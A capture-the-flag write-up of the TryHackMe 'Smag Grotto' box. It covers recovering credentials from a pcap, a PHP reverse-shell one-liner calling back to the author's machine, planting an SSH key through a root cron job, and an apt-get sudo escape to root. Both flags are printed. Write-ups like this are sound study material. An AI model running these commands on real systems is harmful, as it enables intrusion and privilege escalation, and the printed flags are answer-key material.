### Smag Grotto — TryHackMe Writeup

Smag Grotto is a neat little web box that hides everything in plain sight: a quiet webserver, an exposed mail directory, a pcap with breadcrumbs, a careless cron job, and an apt-get sudo misconfiguration.


<img width="1902" height="370" alt="Screenshot 2025-11-13 233146" src="https://github.com/user-attachments/assets/0130ac55-3366-470e-8a5d-cf1bd589f78c" />


---

### quick nmap

First thing, scan the box :

```nmap 10.201.50.43```


<img width="610" height="193" alt="Screenshot 2025-11-13 211644" src="https://github.com/user-attachments/assets/5ae3c779-5c87-4f44-ad0b-15568eab3717" />


Results:
- 22/tcp open ssh  
- 80/tcp open http

Port 80 serves a bland “Welcome to Smag!” page with nothing in the source. 


<img width="1920" height="1080" alt="Screenshot_2025-11-13_21_17_53" src="https://github.com/user-attachments/assets/ed0ba16e-676a-4410-b773-b3fbe729acc3" />


---

### Directory fuzzing 
Time to fuzz for hidden stuff.


<img width="782" height="632" alt="Screenshot 2025-11-13 212216" src="https://github.com/user-attachments/assets/90d28e45-576e-4468-ae2f-61974cb7c263" />



dirsearch found a /mail/ directory. Opening it shows a small email thread about a “Network Migration” and an attachment: dHJhY2Uy.pcap. The web UI even tells you to download attachments with wget.



<img width="1920" height="1080" alt="Screenshot_2025-11-13_21_19_59" src="https://github.com/user-attachments/assets/342ea663-616f-4ad5-ba5a-89c2e24de45f" />



I grabbed the pcap and opened it in Wireshark.



<img width="1911" height="811" alt="Screenshot 2025-11-13 233644" src="https://github.com/user-attachments/assets/f316f06c-0d91-44e4-8e04-9bdb5fc1153b" />


The pcap contains HTTP traffic which looked sus!


<img width="1886" height="414" alt="Screenshot 2025-11-13 212235" src="https://github.com/user-attachments/assets/b03226b9-0417-43bf-918a-5c3c07f012a8" />



I filtered for POSTs and found a POST to /login.php carrying credentials:

username=helpdesk  
password=cH4nG3M3_now


<img width="609" height="360" alt="Screenshot 2025-11-13 214543" src="https://github.com/user-attachments/assets/6d1b21e6-9de9-468e-89cf-85c879871b72" />



The Host header shows development.smag.thm — maybe a virtual host. coz there was no DNS for that name on my network, so I added an /etc/hosts entry:

```10.201.50.43 development.smag.thm```

Then I opened the vhost in the browser.
development.smag.thm serves an index with login.php and admin.php.


<img width="913" height="372" alt="Screenshot 2025-11-13 225242" src="https://github.com/user-attachments/assets/762692c4-eecc-4e21-bc03-8a4f2327facd" />


---

### vhost and admin panel

I used the credentials from the pcap (helpdesk / cH4nG3M3_now) 


<img width="842" height="346" alt="Screenshot 2025-11-13 230017" src="https://github.com/user-attachments/assets/548100de-d45e-449e-9ed5-ec46b588ef14" />



and we get logged into the admin area.
The admin page exposes a simple command box where you can enter a command and see the output.



<img width="816" height="394" alt="Screenshot 2025-11-13 230141" src="https://github.com/user-attachments/assets/fc53e067-19d4-4100-8d3c-3a805e2a7ebc" />



I turned that into a reverse shell to my machine by executing a small PHP one-liner in the command box, and listening on my side with netcat:

```
php -r '$sock=fsockopen("10.17.1.102",4444); exec("/bin/sh -i <&3 >&3 2>&3");'
```

Netcat accepted the connection and I had a shell as www-data.


<img width="578" height="226" alt="Screenshot 2025-11-13 230401" src="https://github.com/user-attachments/assets/ef517d40-3f7d-485c-9402-d33b7e38fee9" />



---

### Enumerate as www-data

From the webshell I explored the filesystem. /home/jake exists and contains user.txt, but www-data can’t read it. While poking around I checked cron jobs and found the system crontab had a curious line:

/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys


<img width="895" height="298" alt="Screenshot 2025-11-13 231215" src="https://github.com/user-attachments/assets/abcccf14-b61c-403b-a361-4970887ec666" />


That’s the jackpot: whatever is in /opt/.backups/jake_id_rsa.pub.backup will be copied into jake’s authorized_keys by root on the cron schedule. If I can place my public key into that backup file, it will be promoted to jake’s authorized_keys and I can SSH in as jake.

---

### Planting an SSH key for jake

Locally I generated an ed25519 keypair:

```
ssh-keygen
```


<img width="843" height="544" alt="Screenshot 2025-11-13 231745" src="https://github.com/user-attachments/assets/cb4bb093-7d96-4a3f-8bf6-cf2011ca1268" />



I then used the webshell to write my public key into the backup file:

```
echo "ssh-ed25519 AAAA... mykey" > /opt/.backups/jake_id_rsa.pub.backup
```


<img width="938" height="273" alt="Screenshot 2025-11-13 231807" src="https://github.com/user-attachments/assets/57279010-02de-4801-833a-7ca7deefbe33" />



When cron runs, root will copy that file into /home/jake/.ssh/authorized_keys. After the cron job completed, I used my private key to SSH in as jake:

```
ssh -i id_ed25519 jake@10.201.50.43
```


<img width="752" height="258" alt="Screenshot 2025-11-13 231816" src="https://github.com/user-attachments/assets/58aa6d8c-d248-42cc-aa95-13aed1e89f50" />


Login succeeded. Now I can read /home/jake/user.txt


<img width="372" height="58" alt="Screenshot 2025-11-13 232334" src="https://github.com/user-attachments/assets/070d8a87-8c43-452b-a81e-0b74c67224ee" />


```iusGorV7EbmxM5AuIe2w499msaSuqU3```


User flag captured.

---

### Privilege escalation from jake to root

I checked sudo privileges for jake:

```sudo -l```


<img width="991" height="101" alt="Screenshot 2025-11-13 232537" src="https://github.com/user-attachments/assets/91f2a2f4-7e3f-4cce-ac07-b5830726f0a4" />



That’s an apt-get sudo allowance with no password — a classic escalation vector. 
Using a GTFObins pattern, apt-get can be abused to run arbitrary commands via APT options that trigger Pre-Invoke hooks. The simplest working one-liner was:

```sudo apt-get update -o APT::Update::Pre-Invoke=/bin/sh```


<img width="1364" height="603" alt="Screenshot 2025-11-13 233104" src="https://github.com/user-attachments/assets/f647a0af-3e3d-4e44-8a6e-d9b8ef5a044c" />



That spawned a root shell. 


<img width="618" height="158" alt="Screenshot 2025-11-13 232918" src="https://github.com/user-attachments/assets/9e9d17be-fbbb-4826-b1c1-00b3382068b4" />


I went to /root and read root.txt


<img width="446" height="104" alt="Screenshot 2025-11-13 233020" src="https://github.com/user-attachments/assets/ba1fa92b-c2b3-4de5-bad1-cfedb107ccdc" />


```uJr6zRgetaniyHVRqqL58uRasybBKz2T```

Root flag captured. Woop! Woop!! (Standard tryhackme celebration.. lol)

---

Flags
- User (jake): iusGorV7EbmxM5AuIe2w499msaSuqU3  
- Root: uJr6zRgetaniyHVRqqL58uRasybBKz2T

----


